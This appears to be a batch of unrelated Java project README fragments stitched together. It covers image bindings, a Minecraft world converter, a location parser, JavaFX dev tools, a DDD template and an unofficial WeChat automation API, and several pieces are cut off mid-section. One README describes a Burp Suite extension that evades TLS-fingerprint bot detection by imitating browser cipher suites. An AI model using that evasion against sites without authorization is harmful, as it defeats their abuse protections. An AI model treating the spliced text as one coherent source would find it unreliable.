@KBusiness(name = Trade1Constants.BIZ_CODE_NAME, code = Trade1Constants.BIZ_CODE)
@Component
public class Trade1Identity implements NormalBizIdentityDefinition {

  @Override
  public String supportedBizCode() {
    return Trade1Constants.BIZ_CODE;
  }

  @Override
  public String scanPath() {
    return ""*"";
  }

  @Override
  public MatchResult match(Object request) {
    CreateOrderRequest createOrder = (CreateOrderRequest) request;
    if (createOrder.getBizCode().equals(""trade1"")) {
      return MatchResult.MATCH;
    } else {
      return MatchResult.NOT_MATCH;
    }
  }
}
```
1. 扩展点需要业务去实现，定义业务类实现`NormalBizIdentityDefinition `,并将其定义为 Spring Bean
2. 实现`match`方法，入参为执行扩展点的方法的入参，如果满足生效条件返回MATCH，否则返回NOT_MATCH
3. 在业务类上添加`@KBusiness`注解，`code`为这个业务对应的业务身份


### 实现扩展点

```java
@KBizRealize(bizCode = Trade1Constants.BIZ_CODE)
@Component
public class Trade1Realize implements OrderPriceExtPoints {

  @Override
  public Long calculateExpressFee(CreateOrderDTO createOrderDTO) {
    return 1000L;
  }
}
```
1. 实现扩展点接口方法，实现该业务对应的逻辑，并将该实现类定义为 Spring Bean
2. 在实现类上添加`@ KBizRealize `注解，`bizCode `为对应的业务身份

  - **Single Responsibility Principle (SRP)**
  - **Open/Closed Principle (OCP)**: O sistema está projetado para permitir a adição de novas funcionalidades sem modificar o código existente, utilizando extensões de classes e interfaces.
  - **Liskov Substitution Principle (LSP)**: As subclasses podem substituir as classes base sem alterar o comportamento esperado do sistema, garantindo consistência nas implementações.
  - **Interface Segregation Principle (ISP)**: Interfaces são projetadas para serem específicas e focadas, evitando interfaces grandes e abrangentes e permitindo que as classes implementem apenas os métodos necessários.
  - **Dependency Inversion Principle (DIP)**: Dependências são abstraídas por meio de interfaces, em vez de depender diretamente de implementações concretas, facilitando a substituição e o teste das dependências.

- **Dependency Injection** - Para promover a inversão de controle e facilitar a gestão de dependências, permitindo uma arquitetura mais modular e testável.
- **Asynchronous Programming** - Utilizado para melhorar a performance e a escalabilidade da aplicação, especialmente em operações de rede e I/O.
- **Command Pattern** - Utilizado para encapsular todas as informações necessárias para executar uma ação, permitindo o uso de comandos de forma desacoplada e flexível.



## 🌐 Funcionalidades

- **Criar Conversas Interativas** - Permite iniciar e gerenciar conversas com uma interface de linha de comando.

## Requirements

1. Java 11

2. In order to be able to save `Photos` you need to sign up to [Cloudinary](https://cloudinary.com/) and enter your credentials in the `application.properties` file of the Spring Boot app (`SocialNetwork\Server\src\main\resources\application.properties`)

## Start the app

### **Option 1 - Start the Client and the Server manually**

#### 1. Start the Client

To start the Client you need to enter the `SocialNetwork/Client` folder:

```bash
$ cd SocialNetwork/Client
```

Install all dependencies:

```bash
$ npm install
```

Run the app in the development mode:

```bash
$ npm start

Open [http://localhost:3000](http://localhost:3000) to view it in the browser.

#### 2. Start the Server

Go to the root directory of the Spring Boot app:

```bash
$ cd SocialNetwork/Server
```

Start the Server:

```bash
$ mvn spring-boot:run
```
The Server is running on port `8000`.


### **Option 2 - Start the application in Docker**

1. **Start the application**

Go to the project directory( `SocialNetwork/` ) and run:

```bash
$ docker-compose up -d
```

The front-end server will start on port `9090`. To open it enter in your browser:

```bash
$ http://localhost:9090
```

lopcode/vips-ffm,main,"# vips-ffm

[libvips](https://github.com/libvips/libvips) bindings for JVM projects, using the ""Foreign Function & Memory API""
([JEP 454](https://openjdk.org/jeps/454)), and the ""Class-File API"" ([JEP 457](https://openjdk.org/jeps/457)) released in JDK 22. The combination
of libvips, FFM, and auto-generated helpers means these bindings are complete (supporting all libvips operations), safe,
and [faster](https://github.com/lopcode/vips-ffm/issues/59#issuecomment-2367634956) than AWT or JNI-based alternatives.

Supports a vast range of image formats, including HEIC, JXL, WebP, PNG, JPEG, and more. Pronounced ""vips (like zips)
eff-eff-emm"". The project is relatively new, but aims to be production ready. Tested on macOS 14, Windows 11, and Linux
(Ubuntu 24.04). Should work on any architecture you can use libvips and Java on (arm64/amd64/etc).

Used the library? I'd love to hear from more users - let me know in [Discussions](https://github.com/lopcode/vips-ffm/discussions).

Please also give [the repo](https://github.com/lopcode/vips-ffm) a star 🌟️!

## Usage

`vips-ffm` is available on Maven Central. To get set up with Gradle:

```kotlin
repositories {
    mavenCentral()
}

dependencies {
    implementation(""app.photofox.vips-ffm:vips-ffm-core:1.2.2"")
}
```
When running your project you must add `--enable-native-access=ALL-UNNAMED` to your JVM runtime arguments. If you
don't, you'll get a warning about ""Restricted methods"". In the future, the JVM will throw an error if you don't
explicitly include this flag.

As the project uses the Java FFM API, it must target JDK 22+. Bindings are currently generated from libvips `8.16.0`,
however they use the underlying libvips operation API. Most operations **do not** use the C API directly (as described
in the [bindings docs](https://www.libvips.org/API/current/binding.html)) - they should be safe to use with different
libvips versions, assuming there haven't been major changes.

> [!NOTE]
> This library **does not** include `libvips` in the download, you must add it to the system/container you're building
> for. See details in [native library loading](#native-library-loading).

All libvips operations are exposed via helper classes, like `VImage`. You must provide an [Arena][1] to operations like
`VImage.newFromFile`, which constrains the lifetime of objects generated during usage. You can get an appropriate arena
by using `Vips.run` as shown in the [sample](#thumbnail-sample) below. `VImage` and associated enums have extensive
Javadocs included, which are automatically generated from the same source that the libvips website uses, for ease of use.
These helper objects expose their raw pointers as a last resort via functions like `VTarget.getUnsafeStructAddress` - if
you need to use these raw pointers and can't find an alternative, please file a GitHub Issue.

Helper enums are generated for the version of libvips shown above. If you need to use an enum from another version,
which isn't present in `vips-ffm`, you can use `VipsOption.Enum(rawValue)` or `VEnum.Raw(rawValue)`.

> [!CAUTION]
> Bindings generated by `jextract` are available in `VipsRaw`, and wrapped with validation in `VipsHelper`. These
> functions are difficult to use without accidentally causing memory leaks, or even segfaults! If what you want to do is
> available in `VImage` and other `V`-prefixed classes, use those instead. If you notice something missing, please open
> a GitHub Issue.

### Thumbnail sample

To get a feeling for the bindings, here's an indicative sample written in Kotlin (using the Java bindings) that:
* Loads an original JPEG image from disk
* Writes a copy of it to disk
* Creates a 400px thumbnail from the original, and writes that to disk

```kotlin
import app.photofox.vipsffm.Vips
import app.photofox.vipsffm.VImage
import app.photofox.vipsffm.VipsOption
import app.photofox.vipsffm.enums.VipsAccess

// ...

// Call once to initialise libvips when your program starts, from any thread
Vips.init()

// Use `Vips.run` to wrap your usage of the API, and get an arena with an appropriate lifetime to use
// Usage of the API, arena, and resulting V-Objects must be done from the thread that called `Vips.run`
Vips.run { arena ->
    val sourceImage = VImage.newFromFile(
      arena,
      ""sample/src/main/resources/sample_images/rabbit.jpg"",
      VipsOption.Enum(""access"", VipsAccess.ACCESS_SEQUENTIAL) // example of an option
    )
    val sourceWidth = sourceImage.width
    val sourceHeight = sourceImage.height
    logger.info(""source image size: $sourceWidth x $sourceHeight"")

    val outputPath = workingDirectory.resolve(""rabbit_copy.jpg"")
    sourceImage.writeToFile(outputPath.absolutePathString())

    val thumbnail = sourceImage.thumbnail(
      ""sample/src/main/resources/sample_images/rabbit.jpg"",
      400
    )
    val thumbnailWidth = thumbnail.width
    val thumbnailHeight = thumbnail.height
    logger.info(""thumbnail image size: $thumbnailWidth x $thumbnailHeight"")
}

// Optionally call at the end of your program, for memory leak detection, from any thread
Vips.shutdown()
```

## Samples

Samples are included that show various usages of these bindings. They include validations, and run on GitHub Actions as
""end-to-end tests"" during development. You can find them all listed [here](https://github.com/lopcode/vips-ffm/tree/main/sample/src/main/kotlin/vipsffm/sample).

To get set up to run samples (on macOS):
* `brew install vips`
* `sdk use java 22-open`
* Then either:
  * Run `./run_samples.sh` in your terminal
  * Use the included `Run samples` profile in IntelliJ

## Native library loading

This library requires the `libvips`, `glib`, and `gobject` native libraries to be present in your library path:
* On macOS: `DYLD_LIBRARY_PATH` (eg `DYLD_LIBRARY_PATH=/opt/homebrew/lib` if you used `brew install vips`)
* On Linux: `LD_LIBRARY_PATH`
* On Windows: `PATH`

The naming conventions of these libraries are not consistent across operating systems, so vips-ffm attempts to load each
in the following order:
* `vips`, `vips.{abiNumber}`, `libvips-{abiNumber}` 
* `glib-2.0`, `glib-2.0.{abiNumber}`, `libglib-2.0-{abiNumber}`
* `gobject-2.0`, `gobject-2.0.{abiNumber}`, `libgobject-2.0-{abiNumber}`

Override properties are provided to set your own ""ABI number"", but note that vips-ffm might not support that version
yet (which could manifest as crashes/segfaults):
* `vipsffm.abinumber.vips.override`, default: `42`
* `vipsffm.abinumber.glib.override`, default: `0`
* `vipsffm.abinumber.gobject.override`, default: `0`

## Project goals

Ideas and suggestions are welcome, but please make sure they fit in to these goals, or you have a good argument about
why a goal should change!

* Avoid manual work by automating as much as possible. This means upstream changes can be rapidly integrated.
* Use the libvips operations API, as described in the [libvips documentation](https://www.libvips.org/API/current/binding.html)
* Provide access to the raw bindings (`VipsHelper`), so users aren't blocked by helper bugs or API annoyances.
* Incubate in [Photo Fox](https://github.com/lopcode/photo-fox) with some ""real world"" usage.

## Contributing

I'm not currently looking for external code contributions. If you'd like to help the project:

* Use the library and give your feedback in [Discussions](https://github.com/lopcode/vips-ffm/discussions)
  * Or [file an issue](https://github.com/lopcode/vips-ffm/issues) if you have a problem!
* Share the [announcement post](https://www.lopcode.com/posts/2024/10/vips-ffm-1/) in your circles
* Star the repo 🌟

Thank you for being enthusiastic about the project!

## Releasing

* GitHub Releases automatically result in a deployment to GitHub Packages
* Maven Central releases happen manually 
  * This can only be done by @lopcode
  * And only after a GitHub Release is made
  * Run `./publish_release_to_maven_central.sh <version matching github release version, including v prefix>`

**Microsoft Creator Docs:**
https://learn.microsoft.com/en-us/minecraft/creator/documents/chunkeroverview?view=minecraft-bedrock-stable

App Usage
--------

You can find pre-built copies of Chunker in the [releases section](https://github.com/HiveGamesOSS/Chunker/releases).
Otherwise, see the building section on how to build Chunker yourself.

Download the appropriate version of the application depending on your operating system and then you will be able to run
the electron based frontend for Chunker.

CLI Usage
--------

**Requirements**

- Java 17 or higher

You can find pre-built copies of Chunker in the [releases section](https://github.com/HiveGamesOSS/Chunker/releases).
Otherwise, see the building section on how to build Chunker yourself.

Chunker can be run as a command-line application or as a UI, to use Chunker as a command line application run it as so:

`java -jar chunker-cli-VERSION.jar -i ""my_world"" -f BEDROCK_1_20_80 -o output`

The following parameters are required:

- `-i` / `--inputDirectory` - the path relative to the application which should be used as the input directory.
- `-o` / `--outputDirectory` - the path relative to the application which should be used as the output directory.
- `-f` / `--outputFormat` - the output format to convert the world to in the form `EDITION_X_Y_Z`,
  e.g. `JAVA_1_20_5`, `JAVA_1_20`, `BEDROCK_1_19_30`.

Additionally, the following parameters are supported:

- `-m` / `--blockMappings` - a path to a json file or a json object containing block mappings.
- `-s` / `--worldSettings` - a path to a json file or a json object containing world settings.
- `-p` / `--pruning` - a path to a json file or a json object containing pruning settings.
- `-c` / `--converterSettings` - a path to a json file or a json object containing converter settings.
- `-d` / `--dimensionMappings` - a path to a json file or a json object containing dimension mappings.
- `-k` / `--keepOriginalNBT` - indicates that NBT should be copied from the input to output where processed by Chunker,
  this is only supported where the output format is the same as the input and for optimal results you will want to copy
  the input world to the output folder prior to conversion.

You can export settings for your world by using the web interface on `https://chunker.app` through the Advanced
Settings -> Converter Settings tab, the CLI also supports preloading settings from the input directory.

You can also get Chunker to list available formats by providing an incorrect input,
e.g. `java -jar chunker-VERSION.jar -f ?`.

Building
--------

**Requirements**

- Git
- Java 17 or higher
- Gradle (Optional)

**Note:** Chunker is split into `app` and `cli`, the app provides an electron frontend for the application and the cli
is a pure java application which can be used for conversion / integrating conversion.

**Steps**

1. Clone this repository via `git clone git://github.com/HiveGamesOSS/Chunker.git`.
2. Build the project via `./gradlew build`.
3. Obtain the binary from `build/libs/` (either as a CLI jar, native CLI executable or with the electron frontend).

Chunker also uses its own fork of a Java LevelDB implementation, https://github.com/HiveGamesOSS/leveldb-mcpe-java/.

Testing
--------

Chunker attempts to do automated testing where possible to validate data, an example of this is block identifiers are
validated against the palette of the Bedrock and Java, this allows issues with faulty mappings to be identified in the
build process. You can skip tests in the build process by appending `-x test` to the `./gradlew build` command.

Some tests have been excluded from the default test suite marked with the ""LongRunning"" tag, this is because they can 
take several minutes to fully complete.


Currently unsupported features
--------
The following features do not convert (or have limited conversion) when using Chunker:

- Entities (excluding paintings / item frames).
- Structure data (e.g. Villages / Strongholds).

License and Legal
--------

```

## Quick Example 🏗

```java
import com.tomaytotomato.SearchLocationService;

public class Main {

    public static void main(String[] args) {
        SearchLocationService searchLocationService = SearchLocationService.builder().build();

        // Find all locations named San Francisco
        List<Location> results = searchLocationService.search(""san francisco"");
        printResults(results);

        // Narrow search to the US
        results = searchLocationService.search(""san francisco, us"");
        printResults(results);

        // Narrow search further to California
        results = searchLocationService.search(""san francisco, us california"");
        printResults(results);
    }

    private static void printResults(List<Location> results) {
        System.out.println(""Locations found: "" + results.size());
        results.forEach(location -> {
            System.out.println(""Country: "" + location.getCountryName());
            System.out.println(""State: "" + location.getStateName());
            System.out.println(""City: "" + location.getCityName());
        });
    }
}

🟢 location4j can parse free text strings with or without punctuation or capitalisation e.g.
> San Francisco, CA, USA
>
> ca united states san francisco
>
> US, San Francisco, california

🟢 Latitude/Longitude searches can use `double`, `BigDecimal`, or `String` inputs for both values;
the types must match (
you can't mix a `String` latitude with a `BigDecimal` or `double` longitude) but the API will accept
any of the three
types.

🔴 location4j cannot find a location based on a small town, street, or
zipcode/postcode.

## More Examples 🧪

**Lookup countries**

For simple lookups the `LocationService` can act like a repository, allow the retrieval of
countries, states and city information.

```java

import com.tomaytotomato.LocationService;

public class LocationServiceExample {

    public static void main(String[] args) {
        LocationService locationService = LocationService.builder().build();

        // Get all countries
        List<Country> countries = locationService.findAllCountries();

        // Filter European countries
        List<Country> europeanCountries = countries.stream()
                .filter(country -> ""Europe"".equals(country.getRegion()))
                .toList();

        // Find Afghanistan by ID
        Country afghanistan = locationService.findCountryById(1);

        // Find all cities named San Francisco
        List<City> cities = locationService.findAllCities(""San Francisco"");

    }
}

```

**Search locations**

Search any text for a location, the `SearchLocationService` can handle formatted or unformatted
text. It will try and find matches against a variety of keywords it has in its dataset.

```java

import com.tomaytotomato.SearchLocationService;

public class SearchLocationServiceExample {

    public static void main(String[] args) {
        SearchLocationService searchLocationService = SearchLocationService.builder()
            .withTextNormaliser(new DefaultTextNormaliser())
            .build();

        // Search for Santa Clara
        List<Location> results = searchLocationService.search(""Santa Clara"");

        // Search for Santa Clara in the USA
        List<Location> resultsUnitedStates = searchLocationService.search(""Santa Clara USA"");

        // Search for Santa Clara in California (it works with ISO2 or ISO3) codes
        List<Location> resultsCalifornia = searchLocationService.search(""Santa Clara US CA"");
    }
}

```

## Motivation 🌱

Parsing location data efficiently is crucial for many applications, yet it can be complex and
time-consuming.

Third-party services like Google Location API can be costly, and using large language models can
introduce significant latency.

location4j offers a practical solution with its own dataset, enabling fast and cost-effective
geographical lookups to a city/town level (which is sufficient in most cases).

This allows applications to be built without another external dependency and the overheads that come
with it.

I may add other functionality in the future if needed e.g. geolocation to nearest place, geofencing
etc.

# OBS Overlay
#### Hide HUD elements from OBS stream by making them an overlay.
**[Modrinth &nearr;](https://modrinth.com/mod/obs-overlay)** • **[CurseForge &nearr;](https://www.curseforge.com/minecraft/mc-mods/obs-overlay)** • **[Got an issue?](../../issues/new)**
<br><br>
<br/>

![Preview](.github/preview.png)

## Installation

This mod is **client-only**.\
At the moment only **Windows** is supported.

### Dependencies

- Cloth Config API
- Architectury API
- Fabric API (Fabric only)
- Mod Menu (Optional, Fabric only)

## Features

This mod lets you hide any combination of the following components:

- Debug menu (F3)
- Chat (without input bar)
- Chat input bar
- Player list (TAB)
- Subtitles (accessibility)
- Scoreboard
- Title and Subtitle from /title
- Actionbar from /title
- Effect display
- Main HUD (health, hunger, armor, experience, hotbar)

Additionally this mod lets you hide any combination of the following *screens*:

- Survival inventory
- Creative inventory
- Pause menu
- Command block screen
- Any HandledScreen by it's ID (e.g. `minecraft:anvil`, `minecraft:furnace`)
- All ingame screens

By default only Debug menu (F3) is hidden.

> [!WARNING]
> There is a possibility OBS might capture the HUD if started before game. If you hide any confidential information, make sure to double-check that it's not visible in the stream.<br><br>
> For additional safety you can enable test icon, which is displayed all the time and should not be visible on stream. It should let you check if the mod is working correctly.<br><br>
> **I am not responsible for any confidential information accidentally shown on stream.**

## Usage

Mod settings can be accessed by:
- Clicking `Settings` -> `Video Settings` -> `OBS Overlay settings`
- Opening mod settings through ModMenu (Fabric only)
- Opening mod settings through Mods menu (Forge only)

DevToolsFX is a tool for navigating your application's scene graph and exploring node properties. It aims to be similar
to Chrome DevTools, but for JavaFX.

It's lightweight, around 250 KB, with no dependencies, allowing you to easily embed it into your app. The only JavaFX
dependency is `javafx.controls`, which your app will need regardless.

<p align=""center"">
<img src=""https://raw.githubusercontent.com/mkpaz/devtoolsfx/master/.screenshots/inspector.png"" alt=""inspector""/>
</p>

Find more screenshots [here](https://github.com/mkpaz/devtoolsfx/tree/master/.screenshots).

## Getting started

Maven:

```xml

<dependency>
    <groupId>io.github.mkpaz</groupId>
    <artifactId>devtoolsfx-gui</artifactId>
    <version>TBD</version>
</dependency>
```

Gradle:

```groovy
dependencies {
    implementation 'io.github.mkpaz:devtoolsfx-gui:TBD'
}
```

After the primary stage is shown, you can launch the dev tools GUI at any time with:

```java
primaryStage.setOnShown(
    e -> GUI.openToolStage(primaryStage, getHostServices())
);
```

Check the `devtoolsfx.gui.GUI` class for additional ways to launch the dev tools, such as embedding it at the top or
bottom. Also, refer to the demo for a more detailed example.

PortSwigger/bypass-bot-detection,main,"# Bypass bot detection
Burp Suite extension that mutates ciphers to bypass TLS-fingerprint based bot detection

## Usage
1. Install the extension from [Releases](https://github.com/PortSwigger/bypass-bot-detection/releases) or build from sources.
2. The extension changes network settings at Settings -> Network -> TLS and select `Use custom protocols and cipher`.
3. Right-click on a Request/Response item in the Proxy History tab, navigate to Extensions -> Bypass bot detection, and select one of the menu items.
4. If the server's response changes (i.e., the number of words and headers are different), the extension will log the message and add notes to the Proxy History.

<img src=""gitimg/bypass-bot-detection.gif"" width=""1024""/>

## Build Instructions
* Ensure that Java JDK 17 or newer is installed
* From root of project, run the command `./gradlew jar`
* This should place the JAR file `Bypass-Bot-Detection-0.0.5.jar` within the `build/libs` directory
* This can be loaded into Burp by navigating to the `Extensions` tab, `Installed` sub-tab, clicking `Add` and loading
  the JAR file
* This BApp is using the newer Montoya API, so it's best to use the latest version of Burp (try the earlier adopter
  channel if there are issues with the latest stable release)

### Modes
- **Firefox Mode**: Install the following list of cipher suites: 4865, 4867, 4866, 49195, 49199, 52393, 52392, 49196, 49200, 49162, 49161, 49171, 49172, 156, 157, 47, 53 and add the Firefox User-Agent header.
- **Chrome Mode**: Use cipher suites 4865, 4866, 4867, 49195, 49199, 49196, 49200, 52393, 52392, 49171, 49172, 156, 157, 47, 53 and add the Chrome User-Agent header.
- **Safari Mode**: Include cipher suites 4865, 4866, 4867, 49196, 49195, 52393, 49200, 49199, 52392, 49162, 49161, 49172, 49171, 157, 156, 53, 47, 49160, 49170, 10 and add the Safari User-Agent header.
- **HTTP2 Downgrade**: By default, Burp uses HTTP/2 to communicate with all servers that advertise support for it during the TLS handshake. When that feature is selected, the Burp Suite will use HTTP/1 even if the server supports HTTP/2. It allows to bypass aggressive HTTP/2 fingerprinting.
- **Brute Force Mode**: Tries different combinations of TLS protocol versions and cipher suites. For a full list, visit: [PortSwigger/bypass-bot-detection](https://github.com/PortSwigger/bypass-bot-detection/blob/d677ad52a3cad97aa51b39b66976e35490cef76d/src/main/java/net/portswigger/burp/extensions/Constants.java#L88).

## Warning
The extension modifies network settings during brute force attacks. It is not recommended to use this extension concurrently with other active scans.

This extension cannot bypass aggressive bot detection

LDemetrios/Kvasir,master,"# Kvasir

Kvasir (/kwɑ'zer/) is an (unofficial) Intellij IDEa plugin adding support for [Typst](https://typst.app/docs) language.

![screenshot.png](screenshot.png)
![preview.png](preview.png)

## Features

- Customizable syntax highlight
- Instant preview (Uses `typst watch` for now)
- Compilation errors display
- Theme-aware preview (background and foreground colors are accessible via `sys.inputs.kvasir-preview-background` and `-foreground` respectively, as a rgb hex string)

The plugin is in the beta stage, a lot of features are yet to come. 
See _Roadmap_ for the information about planned features, 
and _Nearest plans_ for those which are currently in development. 
Feel free to open issues and pull requests.

## Installation

The plugin can be manually installed from disk with [archive](distributions/Kvasir-0.2.0-signed.zip), 
or from JetBrains Marketplace by name.

## Roadmap
(Before opening a feature request make sure it's not already planned)

Listed by group, not by priority (see _Nearest plans_ for those)

- Highlighting
  - [X] Basic Typst formatting
  - [X] Rainbow brackets
  - [ ] Math support
  - [ ] Error recovery (one error shouldn't bust highlighting for the rest of the file)
  - [ ] Language injections: highlight raw code due to its actual language
- Preview and Compiler errors
  - [X] Basic (typst watch)
  - [ ] Integrate tinymist
- Formatter
  - [ ] Sketch formatter (integrate typstfmt or typstyle)
  - [ ] Intellij-based, configurable formatter
- Indexing
  - [ ] Go to definition, renaming, find usages
  - [ ] Hover tips
  - [ ] Inlay hints
  - [ ] Documentation pop-ups
- Scope recognition
  - [ ] Folding ranges
  - [ ] Highlighting current scope
  - [ ] Colored guides
- Code Actions
  - [ ] Commenter
  - [ ] ""Surround with"" (shortcuts for making text italic, bold, etc)
  - [ ] Introduce variable
  - [ ] Pattern recognition (how am I gonna do that? omg)
- Project-level support
  - [ ] Gradle plugin
  - [ ] IDEa project template
  - [ ] Typst project template

## Nearest plans

- Sketch formatter
- More settings
- Error recovery
- Go to definition, renaming, find usages

## Known bugs

- Shorthands inside headings aren't highlighted properly.
- If `page.fill` is not `set` explicitly, the picture may appear transparent. `#set page(fill:white)` (or another color) helps.
- Errors in the `File Errors` are shown in the order of how they are located in the document, not in order of the stacktrace. I'm not sure if it's even possible, but I'm working on it.

# 🚀 快速入门

#### 安装 (Centos Docker安装，已安装Docker可跳过)  


1、安装gcc相关
```
yum -y install gcc
yum -y install gcc-c++
```
2、配置镜像

```
yum install -y yum-utils
yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
yum makecache fast
```
3、安装docker

```
yum install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```


4、启动docker

```
systemctl start docker
//将docker设置成开机自启动
systemctl enable docker.service
```

#### 如何使用

1、导入镜像

```
 docker pull registry.cn-hangzhou.aliyuncs.com/gewe/gewe:latest
 
 docker tag registry.cn-hangzhou.aliyuncs.com/gewe/gewe gewe
```
2、运行镜像容器

```
mkdir -p /root/temp
docker run -itd -v /root/temp:/root/temp -p 2531:2531 -p 2532:2532 --privileged=true --name=gewe gewe /usr/sbin/init
```
3、将容器设置成开机运行

```
docker update --restart=always gewe
```
4、API服务调用

### Api服务调用地址
### http://ip+"":2531/v2/api+接口名""  

### 文件下载地址
### http://ip+"":2532/download+接口返回的文件路径""

### [点击此处查看API文档](https://apifox.com/apidoc/shared-69ba62ca-cb7d-437e-85e4-6f3d3df271b1)




### 项目架构设计
 <img src=""liucheng.jpg"" width=""600px"" height=""350px"" alt="" Logo"">


### 基本用法（java示例）
- 其他语言执行restful接口可实现相同功能，支持各类语言接入。
 
```
 //1、程序部署完成后先获取接口token
 JSONObject token = LoginApi.getToken();
 
 //2、token获取成功后将token值放入header即可访问api，每个api都需要校验token
 header.put(""X-GEWE-TOKEN"",token);
 
 /**
  *3、 获取登录二维码
  * @param appId   设备id 首次登录传空，后续登录传返回的appid
  */
 JSONObject qr = LoginApi.getQr(appid, proxy);
 
 /**
  * 4、确认登陆
  * @param appId

  * @param uuid       取码返回的uuid
  * @param captchCode 登录验证码（必须同省登录才能避免此问题，也能使账号更加稳定）
  */
  JSONObject jsonObject = LoginApi.checkQr(appId, proxyIp, uuid, captchCode);
  
  //5、第四步执行完成则表示微信已登录，执行下列类中的方法可实现不同功能
  LoginApi.class     //登录模块
  PersonalApi.class  //个人账号模块
  ContactApi.class   //联系人模块
  GroupApi.class     //微信群模块
  MessageApi.class   //消息模块
  LabelApi.class     //标签模块
  FavorApi.class     //收藏夹模块
```


### 注意事项：
- 1、系统环境推荐：Centos7或Ubantu2204
- 2、硬件环境推荐：4核8G
- 3、由于容器需要用到2531和2532端口，要保证服务器这两个端口没有被占用
- 4、容器启动后会访问腾讯服务，因此要保证服务器能够访问外网，并且出网没有被限制，否则会导致容器无法正常启动
- 5、使用者必须搭建服务到同省服务器或者电脑里方可正常使用
- 6、本框架面向个人娱乐使用，请勿用于任何商用场景

## 特性
### [1] 符合DDD设计的多模块工程架子
```html
-- api           # 对外接口模块
   |-- rest         # restful接口层
   |-- grpc         # grpc接口层
   |-- dubbo        # dubbo接口层

```
[模块结构说明](.docs/3__structure.md)

### [2] 默认集成开发提效工具
1. lombok帮助简化冗余模版代码
2. mapstruct帮助简化类型转化代码  
[代码增强说明](.docs/1__source_enhance.md)

### [3] 强制代码风格
使用maven-java-formatter-plugin执行代码格式化。  
可添加自定义格式化规则，规则目录在  
[.halo/formatter/format.xml](examples/spring-boot-maven/.halo/formatter/format.xml)

### [4] PMD强制校验低级错误
使用maven-pmd-plugin配合上百条校验规则进行PMD强制校验。  
规则目录在(可添加自定义规则):  
[.halo/pmd-check-rules](examples/spring-boot-maven/.halo/pmd-check-rules/main/resources/pmd-ruleset.xml)  

使用PMD检查工具，并使用git hook强制提交前进行检查，这能大量避免低级错误  
**规则正在逐步添加中**


### [5] 精挑细选的依赖
选取正确的版本，通常是一件蛮复杂的事情，通常有一下一些问题需要考虑：
1. 新鲜：尽量选择JDK兼容下最新的版本，如最新的Spring Boot
2. 兼容：不同库和包之间需要兼容，有时候直接更新到最新版本，会发现几个库之间不兼容
3. 正确：一些包中有内存泄漏，有一些不知名的坑
4. 最佳：选择一些久经考验的库
5. 验证：被大量项目使用，有实时可访问的项目作为在线验证

   | 功能        | 当前选择      | 其他候选                |
   |-----------|-----------|---------------------|
   | 日志        | log4j2    | logback             |
   | jakarta注解 | resteasy  | -                   |
   | 工具类       | hutool    | apache-common/guava |
   | 校验库| hibernate | fluent              |
   |ORM| jimmer    | JPA MyBatis|

### [6] 符合最佳实践的默认配置
1. Spring Boot使用undertow作为内置容器
2. 使用log4j2作为默认日志库，并配置默认log4j2.xml
3. 默认启动优雅停机graceful shutdown  
[最佳实践配置说明](.docs/2__spring_optimize.md)

### [7] 云原声友好(正在建设中)
1. 默认支持k8s下的startup,readiness,liveness探针
2. 提供默认的docker配置
3. 部分框架提供graalvm的native image生成  

### [8] 前端友好(正在建设中)
1. 支持类似swagger的在线文档
2. 自动生成前端直接可用的typescript的接口文件

### [9] 生产就绪的(正在建设中)
1. 默认支持限流
2. 默认支持熔断

### [10] 可追踪(正在建设中)
默认设计好的一套调用追踪日志策略
默认记录出入参数  

## 一个架子能够节省多少时间
1. 搭建一个优秀的架子，一个工作多年的程序员可能也至少需要1-day
2. 久经考验的模块和分包设计，能够节省大量code review的时间和理解成本
3. 工程化地强制代码风格和避免低级错误，能够避免大量低级错误，保证项目质量底线，节省纠正低级错时间
4. 自动生成前端接口，可节省大量接口联调对齐参数的时间

## 打包大小和启动性能
| 模板           | 打包大小    | 启动时间     |
|--------------|---------|----------|
| spring-boot  | 47M     | 2.041s   |
* 较为大的依赖是几大部分：spring本身，mysql driver, jimmer, jackson, log4j2, hutool, h2
* jimmer占用10M左右，有很多不合理的依赖，随着后续的成熟应该会减少
* h2是一个非必要依赖，可以在生产包去掉，只是示例项目依赖h2作为数据库，所以强依赖
* jackson如果替换为其他实现，可能会减少很多体积
* hutool功能是非常强大的，所以也比较大，但其实是值得的
* spring, mysql driver, log4j2 是不容易减少的部分

## 这个项目模板\[template\] \[boilerplate\]的核心设计理念是什么？
这个项目的核心设计理念是：追求软件工程的「外延灵活性」和「内核确定性」
1. 「外延灵活性」是指软件可能适应不同的外在环境，例如允许项目在spring boot/quarkus \
之间灵活切换，在MySql和PostgreSQL之间切换，在RockerMQ和Kafka之间灵活切换。这种隔离性 \
不仅仅是为了应对潜在的变化，更加会促使开发者把真正的业务逻辑沉淀到核心层。
2. 「内核确定性」是指我们希望软件最内核的逻辑是相对稳定的，只有这部分的相对稳定，可测，才能\
保证项目的持续稳定性。我们希望通过DDD把原来隐性的概念，全部转化为领域建模，沉淀在内核之中。

## 为什么强制使用DDD风格，这个风格对于小型项目是否过重？
我们坚定地认可以下3条价值观：
1. 多几个层次划分，让文件和class的位置清晰固定，比节省一个包/目录层次重要
2. 多几行代码把「变量」「函数」「对象」定义出来，让逻辑变得明确，比节省几行代码重要  
3. module之间的强制隔离，能减少很多逻辑层次的划分不明确导致的代码混乱  
如果我们认可以上价值，我们不会认为多分了几个层，多分了几个包就是重。
我们认为有序的层次，远远好于无序的平铺。


## 选择&思考
### 关于maven和gradle
* 后续maven和gradle都会支持。  
* 公司级项目推荐maven，因为简单，因为没有那么多高级特性，所以不用担心某些同事玩出花活儿，下限有保证。  
* 个人级项目推荐gradle，因为行数少，修改依赖简单一些，能节省不少代码，同时也能玩出高级花活儿，上限有保证。  

### 关于Spring boot/quarkus/micronaut/helidon
* 绝大多数情况推荐Spring boot，因为资料多，时髦的graalvm native也能做。  
* 如果实在希望内存占用少，轻量化且现代化，推荐quarkus，热更新做得特别好，DI是一个build-time的实现。
* micronaut的显著特点是编译期DI和编译期AOP，考虑极致性能可以考虑。
* helidon现在没有特别优势，暂不建议投入学习过多。  

### 关于IoC/DI注入注解
* 推荐使用jakarta标准注解，而不用spring的@Autowire

### 关于restful接口的注解
* 建议用jakarta标准注解，就算在spring环境中也建议用标准注解。
* 你会发现万一有一天需要迁移到其他框架的时候，能节省大量工作量。
* 最主要的是jakarta标准注解比起spring注解也没有太多不方便的地方。

### 关于文档
#### REST接口
* 通过interface直接生成OpenApi文档是较好的工程实践
